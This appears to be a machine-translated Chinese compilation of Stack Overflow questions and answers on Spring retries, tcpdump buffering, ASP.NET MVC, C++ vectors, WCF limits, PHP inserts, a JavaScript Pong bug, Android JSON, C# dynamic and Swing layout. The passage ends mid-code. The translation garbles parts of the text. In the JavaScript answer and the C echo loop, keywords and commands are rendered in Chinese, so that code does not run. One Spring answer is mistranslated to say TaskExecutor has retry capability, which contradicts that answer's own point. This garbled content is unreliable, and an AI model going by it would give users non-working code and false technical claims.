# java - 如何在 Spring TaskExecutor 中进行重试

> ID：14111069
> 
> 赞同：0
> 
> 时间：2013-01-01T13:56:37.747
> 
> 标签：java, spring, scheduled-tasks

遵循我使用 Spring 3 TaskExecutor 为异步邮件发送所做的代码。代码工作正常，我只想知道是否有任何邮件因任何原因未能发送，然后必须再次将其添加到队列中并且必须重试发送。

我已经用 Google 搜索过，但没有获得有关重试政策的信息。

帮助将不胜感激！

```
@Service
public class AsyncMailSender implements MailSender {

    /* Logger for Search-Controller Class */
    public static final Logger LOGGER = Logger.getLogger(AsyncMailSender.class);

    @Autowired
    private MailSender mailSender;

    @Autowired
    private TaskExecutor taskExecutor;

    @Autowired
    private VelocityEngine velocityEngine;

    public void send(SimpleMailMessage simpleMessage) throws MailException {
        Map<String, Object> modelMap = new HashMap<String, Object>();
        modelMap.put("user", "Manoj");
        simpleMessage.setText(VelocityEngineUtils.mergeTemplateIntoString(velocityEngine, "templates/email.vm", modelMap));
        taskExecutor.execute(new AsyncMailTask(simpleMessage));
    }

    public void send(SimpleMailMessage[] simpleMessages) throws MailException {
        for (SimpleMailMessage message : simpleMessages) {
            send(message);
        }
    }

    private class AsyncMailTask implements Runnable {

        private SimpleMailMessage message;

        private AsyncMailTask(SimpleMailMessage message) {
            this.message = message;
        }

        public void run() {
            LOGGER.info("Sending Emails" + message.getSubject());
            mailSender.send(message);
        }
    }
} 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-01-01T14:41:13.600

AFAIK，目前无法使用 Spring 3 TaskExecutor 配置重试，有一个与之相关的[SPR](https://jira.springsource.org/browse/SPR-6860)。话虽如此，我认为如果抛出任何异常，Spring 会自动重试该方法。如果异常不断重复，这对您来说可能是个问题（在资源消耗方面）。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2014-10-30T21:51:00.600

这可能并不理想，但您可以在任务中使用[Spring-Retry](https://github.com/spring-projects/spring-retry)，如下所示：

```
@Service
public class AsyncMailSender implements MailSender {

    @Autowired
    RetryTemplate retryTemplate;

    private class AsyncMailTask implements Runnable {

        private SimpleMailMessage message;

        private AsyncMailTask(SimpleMailMessage message) {
            this.message = message;
        }

        public void run() {
            retryTemplate.execute(new RetryCallback<Void, PersistenceException>() {

                    LOGGER.info("Sending Emails" + message.getSubject());
                    mailSender.send(message);

                    return null;
                }
            });

        }
    } 
```

您可以像这样配置 RetryTemplate：

```
@Configuration
public class RetryConfiguration {

    @Bean 
    RetryTemplate retryTemplate() {

        RetryTemplate template = new RetryTemplate();

        TimeoutRetryPolicy policy = new TimeoutRetryPolicy();
        policy.setTimeout(30000L);

        template.setRetryPolicy(policy);

        ExponentialBackOffPolicy backOffPolicy = new ExponentialBackOffPolicy();
        template.setBackOffPolicy(backOffPolicy);

        return template;
    }
} 
```

您可能还会发现[Spring-Batch](http://projects.spring.io/spring-batch/)很有用。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-01-01T20:03:00.750

**春天不适合你**

您必须自己进行异常处理和排队。它`TaskExecutor`本身具有重试能力，因为它只是在下一个配置的时间间隔运行您的任务，无论如何。

# unix - 带有管道的 Tcpdump 变慢

> ID：14111070
> 
> 赞同：1
> 
> 时间：2013-01-01T13:56:44.813
> 
> 标签：unix, buffer, pipeline, tcpdump

我对 tcpdump 的行为感到非常惊讶。我写了简单的代码来做回声，比如：

> > 而 (n)
> > 
> > {
> > 
> > n = fread(buf, 16, 1, 标准输入);
> > 
> > printf("%s", buf);
> > 
> > fflush（标准输出）；
> > 
> > }

然后我做类似的事情

> > $ tcpdump | ./EchoTest

我在回显输出中得到了很多 tcpdump 数据包，直到其中一些数据包被抑制。为什么会发生？？像

> > $ 猫文件 | ./EchoTest

或者

> > $ 尾 -f 文件 | ./EchoTest
> > 
> > （带有“$ echo "blabla" >> 文件）

完美运行，我立即得到输出。有人知道如何强制 tcpdump 在管道中输出它吗？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-01-01T18:25:27.870

从[`tcpdump`手册页](http://linux.die.net/man/8/tcpdump)：

> **-l**
> 
> 使标准输出行缓冲。如果您想在捕获数据时查看数据，这很有用。例如，
> 
> ''tcpdump -l | tee dat'' 或 ''tcpdump -l > dat & tail -f dat''。

底线： 的输出`tcpdump`被缓冲 - 您需要`-l`选择让它立即输出每个数据包/行。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-01-01T18:28:49.540

tcpdump 可能比仅处理数据包的流量要多得多，通常会减慢它的速度以及@thkala 的建议正在解决。用`-n`选项喂它会加速它的输出。

```
-n     Don't convert addresses (i.e., host addresses, port numbers, etc.) to names. 
```

# asp.net - 如何在 mvc4 中调用另一个控制器的视图

> ID：14111071
> 
> 赞同：7
> 
> 时间：2013-01-01T13:56:55.363
> 
> 标签：asp.net, razor, asp.net-mvc-4, razor-2

我有 2 个控制器，`SearchController`并且`DetailsController`.

`SearchController`包含 2 个包含表单的视图。

`[HttpPost]`我想在 SearchController 中的视图操作上重定向到详细信息控制器的视图

这可能吗？？？

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2013-01-01T14:08:49.497

如果您在第一个控制器中进行一些处理，然后将结果发送到另一个控制器，您可以尝试[RedirectToAction 。](http://msdn.microsoft.com/en-us/library/system.web.mvc.controller.redirecttoaction%28v=vs.108%29.aspx)

**看法**

```
using(@Html.BeginForm("firstaction", "search", FormMethod.Post)){

   // form stuff
} 
```

**控制器**

```
public class SearchController
{

      [HttpPost]
      public ActionResult FirstAction()
      {
          // do initial processing in the first controller
          // e.g persisting changed on Edit Screen

          return RedirectToAction("SecondAction","Details");

      }
}

public class DetailsController
{
     public ActionResult SecondAction()
      {
          // do remaining processing in the first controller
          // fetching data for a grid and displaying the grid of items

          return View();
      }
} 
```

# c++ - 如何保存对象集合并在 C++ 向量中使用它们

> ID：14111074
> 
> 赞同：0
> 
> 时间：2013-01-01T13:57:23.770
> 
> 标签：c++

我需要使用具有 MyClass 类型的向量。

```
vector<MyClass> vMyClass;
vMyClass.Push_Back(new MyClass); 
```

这似乎对我不起作用。出了什么问题？我正在尝试模拟 C# 中的列表。

然后我需要对列表中的所有项目执行操作。就像在 vMyClass 中的 C# foreach 项目中一样。

我到处寻找一个简单的例子，但没有运气。请帮忙。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-01-01T13:58:16.617

`new MyClass`返回指向 a 的指针`MyClass`，但您的向量包含对象，而不是指针。

尝试

```
vMyClass.push_back(MyClass()); 
```

或者，如果您需要动态内存

```
vector<MyClass*> vMyClass; 
```

与您的版本。注意全小写`push_back`。

# .net - .net 的哪些版本分为客户端版和完整版？

> ID：14111078
> 
> 赞同：0
> 
> 时间：2013-01-01T13:57:45.783
> 
> 标签：.net

我正在尝试实施：

```
bool IsFullDotNetVersion()
{

} 
```

（我需要知道 System.Web 是否存在于我正在编写的 Excel 插件的运行时。）

我被引导到[这个问题](https://stackoverflow.com/questions/199080/how-to-detect-what-net-framework-versions-and-service-packs-are-installed/199783#199783)，但它的答案并没有清楚地描述是否足以检查注册表项“HKLM\Software\Microsoft\NET Framework Setup\NDP\v4\Full\Install”是否存在。

是吗？

.Net的其他版本不是分为客户端版还是完整版？

如果安装了完整版的 .Net，我需要在任何环境中确定哪些步骤（注册表项？）？

# asp.net - 使用带有客户端 ASP.NET 的 WCF 发送大量数据

> ID：14111080
> 
> 赞同：1
> 
> 时间：2013-01-01T13:57:59.433
> 
> 标签：asp.net, web-services, c#-4.0, web-config, wcf-client

想要使用 WCF 将数据库中的文件保存为二进制数据。客户端是 ASP.NET C#。我使用以下代码并且能够发送少于 100KB 的内容。

客户端配置文件的代码是

```
<system.serviceModel>
    <bindings>
      <basicHttpBinding>
        <binding name="basicHttpBinding_IService" closeTimeout="00:01:00"
          openTimeout="00:01:00" receiveTimeout="00:10:00" sendTimeout="00:01:00"
          allowCookies="false" bypassProxyOnLocal="false" hostNameComparisonMode="StrongWildcard"
          maxBufferPoolSize="2147483647" maxBufferSize="2147483647" maxReceivedMessageSize="2147483647"
          textEncoding="utf-8" transferMode="StreamedResponse" useDefaultWebProxy="true"
          messageEncoding="Mtom">
          <readerQuotas maxDepth="2147483647" maxStringContentLength="2147483647"
           maxArrayLength="2147483647" maxBytesPerRead="2147483647" maxNameTableCharCount="2147483647" />
          <security mode="None">
            <transport clientCredentialType="None" proxyCredentialType="None"
              realm="">
              <extendedProtectionPolicy policyEnforcement="Never" />
            </transport>
            <message clientCredentialType="UserName" algorithmSuite="Default" />
          </security>
        </binding>
        <binding name="BasicHttpBinding_IWITSService" />

      </basicHttpBinding>
    </bindings>

    <behaviors>
      <endpointBehaviors>
        <behavior name="debuggingBehaviour">

          <dataContractSerializer maxItemsInObjectGraph="2147483647" />

        </behavior>
      </endpointBehaviors>
    </behaviors>
    <client>
      <endpoint address="http://localhost:4175/WITSWCFService.svc"
        binding="basicHttpBinding" bindingConfiguration="BasicHttpBinding_IWITSService"
        contract="MyService.IWITSService" name="BasicHttpBinding_IWITSService" />
    </client>
  </system.serviceModel> 
```

和服务配置文件的代码如下

```
<system.web>
    <compilation debug="true" />
    <httpRuntime executionTimeout="4800" maxRequestLength="2147483647" />

  </system.web>
  <system.serviceModel>
    <bindings>
      <basicHttpBinding>
        <binding name="basicHttpEndpointBinding" closeTimeout="01:01:00"
          openTimeout="01:01:00" receiveTimeout="01:10:00" sendTimeout="01:01:00"
          allowCookies="false" bypassProxyOnLocal="false" hostNameComparisonMode="StrongWildcard"
          maxBufferSize="2147483647" maxBufferPoolSize="2147483647" maxReceivedMessageSize="2147483647"
          messageEncoding="Mtom" textEncoding="utf-8" transferMode="StreamedRequest"
          useDefaultWebProxy="true">
          <readerQuotas  maxDepth="64"  maxStringContentLength="2147483647" maxArrayLength="2147483647" maxBytesPerRead="4096"  maxNameTableCharCount="16384"/>
          <security mode="None">
            <transport clientCredentialType="None" proxyCredentialType="None"
              realm="" />
            <message clientCredentialType="UserName" algorithmSuite="Default"  />
          </security>
        </binding>
      </basicHttpBinding>
    </bindings>
    <services>
      <service name="WITSService.WITSService"  >

        <endpoint bindingConfiguration="basicHttpEndpointBinding" address="basic" binding="basicHttpBinding" contract="WITSService.WITSService" />

      </service>
    </services>

    <behaviors>
      <serviceBehaviors>
        <behavior>
          <serviceMetadata httpGetEnabled="true"/>
          <serviceDebug includeExceptionDetailInFaults="false"/>
          <dataContractSerializer maxItemsInObjectGraph="2147483647"/>
        </behavior>
      </serviceBehaviors>
      <endpointBehaviors>
        <behavior name="myEndPointBehavior">
          <dataContractSerializer maxItemsInObjectGraph="2147483647" />
        </behavior>
      </endpointBehaviors>
    </behaviors>

    <serviceHostingEnvironment multipleSiteBindingsEnabled="true" />
  </system.serviceModel> 
```

当我上传 300 kb 文件时出现此错误

> 远程服务器返回意外响应：(413) Request Entity Too Large

任何人都可以在我犯错的地方帮助我.. 提前致谢

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-01-01T15:29:18.613

我已经通过在我的 Service.config 文件中使用此代码解决了这个问题。

```
<services>
      <service name="Service.IService">
        <clear />
        <endpoint binding="basicHttpBinding" contract="Service.IService" />
      </service>
    </services>
    <bindings>
      <basicHttpBinding>
        <binding maxBufferSize="2147483647" maxReceivedMessageSize="2147483647">
          <readerQuotas maxDepth="32" maxStringContentLength="2147483647"
            maxArrayLength="16348" maxBytesPerRead="4096" maxNameTableCharCount="16384" />
        </binding>
      </basicHttpBinding>
      <webHttpBinding>
        <binding maxBufferSize="2147483647" maxReceivedMessageSize="2147483647" />
      </webHttpBinding>
    </bindings> 
```

# php - 通过 PHP 填充数据库

> ID：14111083
> 
> 赞同：-1
> 
> 时间：2013-01-01T13:58:12.397
> 
> 标签：php, mysql, phpmyadmin, xampp

我正在尝试为项目填充数据库。我已经安装了 Xampp，并且正在使用 phpmyadmin 通过 GUI 访问数据库。该数据库有点大，包含评估给定问题的经济替代方案所需的经济因素。PHP代码：

```
function _fp($n,$i){
return number_format((pow((1+$i),$n)),5);
}

function _pf($n,$i){
return number_format((1/_fp($n,$i)),5);
}

function _pa($n,$i){
return number_format(((pow((1+$i),$n)-1)/($i*pow((1+$i),$n))),5);
}

function _ap($n,$i){
return number_format((1/_pa($n,$i)),5);
}

function _fa($n,$i){
return number_format(((pow((1+$i),$n)-1)/$i),5);
}

function _af($n,$i){
return number_format((1/_fa($n,$i)),5);
}

function _pg($n,$i){
return number_format(((pow((1+$i),$n)-$i*$n-1)/($i*$i*pow((1+$i),$n))),5);
}

function _ag($n,$i){
return number_format((1/$i-$n/(pow((1+$i),$n)-1)),5);
}

$connection=mysql_connect("localhost","root",'');
if($connection){
$db=mysql_select_db("comp_interest_fact");
if(!$db)
    echo "Failed to select 'comp_interest_fact'.\n";
}
else
echo "Failed to connect to database.\n";

$percentage=array('0_25'=>.0025,
    '0_5'=>.005,
'0_75'=>.0075,
'1'=>.01,
'1_25'=>.0125,
'1_5'=>.015,
'2'=>.02,
'3'=>.03,
'4'=>.04,
'5'=>.05,
'6'=>.06,
'7'=>.07,
'8'=>.08,
'9'=>.09,
'10'=>.1,
'11'=>.11,
'12'=>.12,
'13'=>.13,
'14'=>.14,
'15'=>.15,
'16'=>.16,
'18'=>.18,
'20'=>.20,
'22'=>.22,
'24'=>.24,
'25'=>.25,
'30'=>.3);
reset($percentage);
while(list($key,$value)=each($percentage)){
$table="percent_$key";
for($k=1;$k<=50;$k++){
    $fp=_fp($k,$value);
    $pf=_pf($k,$value);
    $af=_af($k,$value);
    $fa=_fa($k,$value);
    $ap=_ap($k,$value);
    $pa=_pa($k,$value);
    $pg=_pg($k,$value);
    $ag=_ag($k,$value);
    mysql_query("INSERT INTO $table         VALUES($k,".$fp.",".$pf.",".$af.",".$fa.",".$ap.",".$pa.",".$pg.",".$ag.")");
}
}
mysql_close($connection); 
```

这个脚本的问题是，一旦我运行它，comp_interest_fact 中的表并没有全部 50 行。实际上他们应该这样做，因为 for 循环需要 50 次迭代和 50 次 INSERT 操作。我找不到问题。谁能帮我？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-01-01T14:14:16.757

将插入条件更改为：

```
 mysql_query("INSERT INTO $table VALUES($k,".$fp.",".$pf.",".$af.",".$fa.",".$ap.",".$pa.",".$pg.",".$ag.")") or die(mysql_error()); 
```

或者更好：

```
mysql_query("INSERT INTO $table VALUES ($k, $fp, $pf, $af, $fa, $ap, $pa, $pg, $ag)") or die(mysql_error()); 
```

同样，按照您当前拥有的功能命名您的函数几乎注定任何未来的开发人员都无法处理您的代码。

突出 Hanky Pankys 评论：

`In Addition to this suggestion, please also note that this code will produce 1350 INSERT operations and not 50\. It will run 50 * 27 Times as per your code`

如果您的 $k 是您的主键，那么您将在每次运行时获得覆盖的值。你真的应该有一个 auto inc 钥匙。

# javascript - 无法为乒乓球画桨

> ID：14111085
> 
> 赞同：0
> 
> 时间：2013-01-01T13:58:20.343
> 
> 标签：javascript

好的，我一直在将我的“功能意大利面条”转换为我的 Pong 游戏的展示原型，并且没有任何运气来绘制桨。

这将绘制黑色画布，但桨拒绝绘制。

我注释掉了 clearCanvas() 以查看它是否存在问题，但无济于事。

好像你肯定想[http://jsbeautifier.org](http://jsbeautifier.org)下面的代码，因为它没有很好地转移 =c

```
/*jslint browser: true, devel: true, indent: 4, undef: true, todo: true*/

canvas = document.createElement('canvas');
canvas.width = 600;
canvas.height = 400;
document.body.appendChild(canvas);
context = canvas.getContext('2d');

/////////////////////////////////////////////////////////////

var Paddle = function (playerSide) {
'use strict';
//constructor, variables go here
var x, y = 20,
    width = 10, height = 50,
    colour = '#FFF';
//Determine which paddle belongs to which player
if (playerSide === 'left') {
    this.x = 20;
} else {
    this.x = 580;
}
};

Paddle.prototype = function () {
"use strict";
//Private members
var draw = function (x, y) {
    context.fillStyle = this.colour;
    context.fillRect(x, y, this.width, this.height);
};
//Public members
return {
    draw: draw
};
}();

/////////////////////////////////////////////////////////////

var Pong = function () {
"use strict";
//constructor, variables go here
//Events
canvas.onmousemove = function (mouse) {
    this.y = mouse.pageY;
};
this.animate();
};

Pong.prototype = (function () {
"use strict";
//Private members
// requestAnim shim layer by Paul Irish
window.requestAnimFrame = (function () {
    return window.requestAnimationFrame ||
        window.webkitRequestAnimationFrame ||
        window.mozRequestAnimationFrame ||
        window.oRequestAnimationFrame ||
        window.msRequestAnimationFrame ||
        function (/* function */callback, /* DOMElement */element) {
            window.setTimeout(callback, 1000 / 60);
        };
}());

var animate = function () {
        requestAnimFrame(animate);
        clearCanvas();
        drawPaddles();
    },

    drawPaddles = function () {
        leftPaddle.draw(leftPaddle.x, leftPaddle.y);
        rightPaddle.draw(rightPaddle.x, rightPaddle.y);
    },

    clearCanvas = function () {
        context.clearRect(0, 0, 600, 400);
    };

//Public members
return {
    animate: animate
};
}());

var leftPaddle = new Paddle('left');
var rightPaddle = new Paddle('right');

var pong = new Pong(); 
```

​</p>

任何想法发生了什么，或者我不理解什么概念？此外，对我的代码的任何评论，否则将不胜感激。

谢谢！

编辑：我最初从 Pong 类初始化了桨，我假设这是正确的，但是当我试图解决桨问题时，这段代码经历了很多变化...... arrrg！

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-01-01T14:10:40.800

问题似乎出在您的“私人成员”、颜色、宽度和高度上。这些成员在一些特权成员函数的闭包中——这意味着它们不能作为“this”的属性访问。

例如，在下面的代码中

```
函数 myClass() {
    变量 x = 1;
    this.sayX = function() {return this.x};
    变量 y = 2;
    this.sayY = function() {return y};
}

var myObject = new myClass();

myObject.sayX(); // 返回“未定义”
myObject.sayY(); // 返回“2”

```

您需要在调用伪私有成员的方法中删除对“this”的引用并定义在同一上下文中调用它们的函数，或者将它们设为对象的公共成员。否则，绘图函数将无法访问桨的颜色和尺寸（这解释了为什么它们不绘图）。

# android - 将数据从 MySQL 导入 Android

> ID：14111086
> 
> 赞同：1
> 
> 时间：2013-01-01T13:58:22.647
> 
> 标签：android, mysql

大家好，新年快乐，我正在尝试从 MySQL 数据库中获取数据并将其显示在我的 android 项目的 ListView 中。

这是主要活动的代码：

MainActivity.java

```
import java.util.ArrayList;
import java.util.HashMap;
import java.util.List;

import org.apache.http.NameValuePair;
import org.apache.http.message.BasicNameValuePair;
import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;

import android.app.Activity;
import android.app.ProgressDialog;
import android.content.Intent;
import android.os.AsyncTask;
import android.os.Bundle;
import android.util.Log;
import android.view.View;
import android.widget.Button;
import android.widget.EditText;
import android.widget.ListView;
import android.widget.SimpleAdapter;

public class MainActivity extends Activity {
    private ProgressDialog pDialog;
    Button BTconnect;
    EditText EDlogin;
    EditText EDmdp;
    private String login;
    private String mdp;
    private HDdb dbase; 
    private JSONParser jsonParser  = new JSONParser();
    public final static String EXTRA_MESSAGE="com.example.HDtesr.id";
    private static String KEY_SUCCESS = "success";

    private static String loginURL = "http://10.0.2.2/android_connect/identification.php";

    private static final String TAG_CMDS = "commandes";
    private static final String TAG_CLIENT = "client";
    private static final String TAG_DEMANDE = "demande";
    private static final String TAG_DATE = "date";
    private static final String TAG_TIME = "time";

    JSONArray cmds = null;
    ArrayList<HashMap<String, String>> cmdsList;
    private HashMap<String, String> map;

    private ListView lv;
    @Override
    public void onCreate(Bundle savedInstanceState) {

        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        BTconnect = (Button) findViewById(R.id.connect);
        EDlogin = (EditText) findViewById(R.id.login);
        EDmdp = (EditText) findViewById(R.id.mdp);
        lv = (ListView) findViewById(R.id.list);    

        BTconnect.setOnClickListener(new View.OnClickListener() {
            public void onClick(View v) {
                  login = EDlogin.getText().toString();
                  mdp = EDmdp.getText().toString();

                 new Identify().execute();

            }
        });
    }

    class Identify extends AsyncTask<String, String, String> {

        @Override
        protected void onPreExecute() {
            super.onPreExecute();
            pDialog = new ProgressDialog(MainActivity.this);
            pDialog.setMessage("Envoi en cours...");
            pDialog.setIndeterminate(false);
            pDialog.setCancelable(true);
            pDialog.show();
        }

         protected String doInBackground(String... args) {

             List<NameValuePair> params = new ArrayList<NameValuePair>();
              params.add(new BasicNameValuePair("login", login));
              params.add(new BasicNameValuePair("mdp", mdp));
            JSONObject json = jsonParser.makeHttpRequest(loginURL,"POST", params);

             // check log cat for response
             Log.d("Create Response", json.toString());

             // check for success tag
             try {

                 int success = json.getInt(KEY_SUCCESS);

                     if(success == 1){
                         cmds = json.getJSONArray(TAG_CMDS);

                         for (int i = 0; i < cmds.length(); i++) {
                               JSONObject c = cmds.getJSONObject(i);

                               // Storing each json item in variable

                               String client = c.getString(TAG_CLIENT);
                              String demande = c.getString(TAG_DEMANDE);
                              String date = c.getString(TAG_DATE);
                               String time = c.getString(TAG_TIME); 

                              map = new HashMap<String, String>();

                    // adding each child node to HashMap key => value

                    map.put(TAG_CLIENT, client);
                   // map.put(TAG_DEMANDE, demande);
                   map.put(TAG_DATE, date);
                    map.put(TAG_TIME, time);
                    cmdsList.add(map);

                           }

                        finish();
                     }else{
                         // Error in login

                     }

             } catch (JSONException e) {
                 e.printStackTrace();
             }

             return null;
         }

         protected void onPostExecute(String file_url) {
             // dismiss the dialog once done
             pDialog.dismiss();
             runOnUiThread(new Runnable() {
            public void run() {

         adapter = new SimpleAdapter(Commande.this,  cmdsList,R.layout.menuitem,new String[] { TAG_DEMANDE,TAG_CLIENT,TAG_TIME},
                      new int[] { R.id.demande,R.id.client,R.id.time});
                lv.setAdapter(adapter);
         }

        });

             }

         }

    } 
```

JSONParser.java

```
import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.io.UnsupportedEncodingException;
import java.util.List;

import org.apache.http.HttpEntity;
import org.apache.http.HttpResponse;
import org.apache.http.NameValuePair;
import org.apache.http.client.ClientProtocolException;
import org.apache.http.client.entity.UrlEncodedFormEntity;
import org.apache.http.client.methods.HttpGet;
import org.apache.http.client.methods.HttpPost;
import org.apache.http.client.utils.URLEncodedUtils;
import org.apache.http.impl.client.DefaultHttpClient;
import org.json.JSONException;
import org.json.JSONObject;

import android.util.Log;

public class JSONParser {

    static InputStream is = null;
    static JSONObject jObj = null;
    static String json = "";

    // constructor
    public JSONParser() {

    }

    public JSONObject makeHttpRequest(String url, String method,
            List<NameValuePair> params) {

        // Making HTTP request
        try {

            // check for request method
            if(method == "POST"){
                // request method is POST
                // defaultHttpClient
                DefaultHttpClient httpClient = new DefaultHttpClient();
                HttpPost httpPost = new HttpPost(url);
                httpPost.setEntity(new UrlEncodedFormEntity(params));

                HttpResponse httpResponse = httpClient.execute(httpPost);
                HttpEntity httpEntity = httpResponse.getEntity();
                is = httpEntity.getContent();

            }else if(method == "GET"){
                // request method is GET
                DefaultHttpClient httpClient = new DefaultHttpClient();
                String paramString = URLEncodedUtils.format(params, "utf-8");
                url += "?" + paramString;
                HttpGet httpGet = new HttpGet(url);

                HttpResponse httpResponse = httpClient.execute(httpGet);
                HttpEntity httpEntity = httpResponse.getEntity();
                is = httpEntity.getContent();
            }           

        } catch (UnsupportedEncodingException e) {
            e.printStackTrace();
        } catch (ClientProtocolException e) {
            e.printStackTrace();
        } catch (IOException e) {
            e.printStackTrace();
        }

        try {
            BufferedReader reader = new BufferedReader(new InputStreamReader(
                    is, "iso-8859-1"), 8);
            StringBuilder sb = new StringBuilder();
            String line = null;
            while ((line = reader.readLine()) != null) {
                sb.append(line + "\n");
            }
            is.close();
            json = sb.toString();
        } catch (Exception e) {
            Log.e("Buffer Error", "Error converting result " + e.toString());
        }

        // try parse the string to a JSON object
        try {
            jObj = new JSONObject(json);
        } catch (JSONException e) {
            Log.e("JSON Parser", "Error parsing data " + e.toString());
        }

        // return JSON String
        return jObj;

    }
} 
```

LogCat 显示它收到了数据，然后显示 JAVA.NULLPOINTEREXCEPTION ！

```
01-01 14:51:31.541: E/AndroidRuntime(660): FATAL EXCEPTION: AsyncTask #1
01-01 14:51:31.541: E/AndroidRuntime(660): java.lang.RuntimeException: An error occured while executing doInBackground()
01-01 14:51:31.541: E/AndroidRuntime(660):  at android.os.AsyncTask$3.done(AsyncTask.java:299)
01-01 14:51:31.541: E/AndroidRuntime(660):  at java.util.concurrent.FutureTask$Sync.innerSetException(FutureTask.java:273)
01-01 14:51:31.541: E/AndroidRuntime(660):  at java.util.concurrent.FutureTask.setException(FutureTask.java:124)
01-01 14:51:31.541: E/AndroidRuntime(660):  at java.util.concurrent.FutureTask$Sync.innerRun(FutureTask.java:307)
01-01 14:51:31.541: E/AndroidRuntime(660):  at java.util.concurrent.FutureTask.run(FutureTask.java:137)
01-01 14:51:31.541: E/AndroidRuntime(660):  at android.os.AsyncTask$SerialExecutor$1.run(AsyncTask.java:230)
01-01 14:51:31.541: E/AndroidRuntime(660):  at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1076)
01-01 14:51:31.541: E/AndroidRuntime(660):  at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:569)
01-01 14:51:31.541: E/AndroidRuntime(660):  at java.lang.Thread.run(Thread.java:856)
01-01 14:51:31.541: E/AndroidRuntime(660): Caused by: java.lang.NullPointerException
01-01 14:51:31.541: E/AndroidRuntime(660):  at com.example.hd_test.MainActivity$Identify.doInBackground(MainActivity.java:95)
01-01 14:51:31.541: E/AndroidRuntime(660):  at com.example.hd_test.MainActivity$Identify.doInBackground(MainActivity.java:1)
01-01 14:51:31.541: E/AndroidRuntime(660):  at android.os.AsyncTask$2.call(AsyncTask.java:287)
01-01 14:51:31.541: E/AndroidRuntime(660):  at java.util.concurrent.FutureTask$Sync.innerRun(FutureTask.java:305)
01-01 14:51:31.541: E/AndroidRuntime(660):  ... 5 more 
```

# c# - 转换为 IEnumerable ?

> ID：14111088
> 
> 赞同：10
> 
> 时间：2013-01-01T13:58:59.753
> 
> 标签：c#, .net, dynamic, extension-methods, ienumerable

我写了这个扩展方法：

```
public static class A
{
 public static IEnumerable<dynamic> AsDynamic<T>(this IEnumerable<T> f)
    {
        foreach (var element in f)
        {
                yield return (dynamic) element;
        }   
    }
} 
```

并对其进行了测试：

```
List<int> l   = new List<int>(){1,2,3};
Console.WriteLine ( l.AsDynamic().GetType()); 
```

但是输出是：`typeof (IEnumerable<Object>)`

*   为什么不是`typeof (IEnumerable<dynamic>)` ？

*   我怎样才能让它像它一样？

* * *

## 回答 #1

> 赞同：27
> 
> 时间：2013-01-01T14:17:14.843

我认为你对什么`dynamic`意思有误解。本质上，当您告诉编译器一个对象的类型是`dynamic`时，您“承诺”该对象**在运行时**将支持您调用的任何方法或属性，以换取编译器**在编译时**不抱怨。您还承诺，如果您违背承诺，您将面临后果。

当你说一个对象是`dynamic`时，编译器无法对类型做出假设，所以它使用`object`，知道任何东西都可以存储为`object`。当你创建一个`IEnumerable<dynamic>`时，它变成了`IEnumerable<object>`，有一个显着的区别：你可以在它的元素上调用任何方法，编译器不会说一个字：

```
IEnumerable<SomeType> original = ...
foreach (dynamic x in original.AsDynamic()) { // Using your method
    Console.WriteLine(x.SomeUnsupportedMethod()); // The compiler is silent!
} 
```

由于`original.AsDynamic()`给出了一系列`dynamic`对象，编译器不会抱怨您对`SomeUnsupportedMethod`. 如果运行时确实不支持该方法，程序会崩溃；如果该方法实际上被 的元素支持`SomeType`，则不会发生崩溃，并且将调用该方法。

这就是`dynamic`你要做的一切；静态地，“占位符”将保留`object`，并`typeof`会告诉你很多。但是直到运行时才会检查对象的确切功能（它的方法和属性）。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-01-01T14:04:18.627

因为`dynamic`不是类型

```
Console.WriteLine(typeof(dynamic)); // error 
```

动态只是在运行时解析实际类型

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2013-01-01T14:08:02.350

按照设计，*运行时*绑定的行为与*静态*绑定尽可能**相似**。

 *所以运行时类型将是`typeof (IEnumerable<Object>)`

静态类型是`typeof (IEnumerable<dynamic>)`

还

运行时在概念上将此视为 true

```
typeof(object)==typeof(dynamic) 
```

所以，

动态类型类似于对象，只是它允许您以编译时未知的方式使用。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2013-01-01T14:04:07.023

尝试 Linq 扩展方法[Cast()](http://msdn.microsoft.com/en-us/library/bb341406.aspx)。但我不确定它是否适用于动态。*

# java - Java GUI 组件和面板对齐

> ID：14111090
> 
> 赞同：0
> 
> 时间：2013-01-01T13:59:12.670
> 
> 标签：java, swing, user-interface, layout-manager

我对 Java GUI 很陌生，在对齐我创建的这个程序的 GUI 时遇到了麻烦。代码如下：

### ****编码 ：****

```
`import javax.swing.*;
import java.awt.*;
import javax.swing.table.DefaultTableModel;
public class SalesScreen{

private JPanel mainPanel = new JPanel();

//Top Member Panel
private JPanel memberPanel = new JPanel(new FlowLayout(FlowLayout.LEFT));
private JLabel memberID =  new JLabel();
private JTextField memberIDField = new JTextField(10);
private JLabel memberName = new JLabel();
private JTextField memberNameField = new JTextField(30);
private JButton memberButton = new JButton("OK");

//Center Table Panel
private JPanel tablePanel = new JPanel(new FlowLayout(FlowLayout.CENTER));
private JTable itemList;
String [] columnNames = {"Barcode" , "Name" , "Price (RM)" , "Quantity"};
int numRows = 30;
DefaultTableModel model = new DefaultTableModel(numRows , columnNames.length);
JScrollPane scroll;

//Bottom Right 
private JPanel infoPanel = new JPanel(new BorderLayout());
private JPanel infoGridPanel = new JPanel( new GridLayout(4,2));
private JPanel infoFlowPanel = new JPanel(new FlowLayout());
private JLabel total = new JLabel("          Total (RM) :");
private JLabel discount = new JLabel("          Discount Rate (%) : ");
private JLabel overall = new JLabel("          Overall (RM) :");
private JLabel payment = new JLabel("          Payment (RM) :");
private JButton process = new JButton("PROCESS");
private JTextField totalPrice = new JTextField(5);
private JTextField discountRate = new JTextField(5);
private JTextField overallPrice = new JTextField(5);
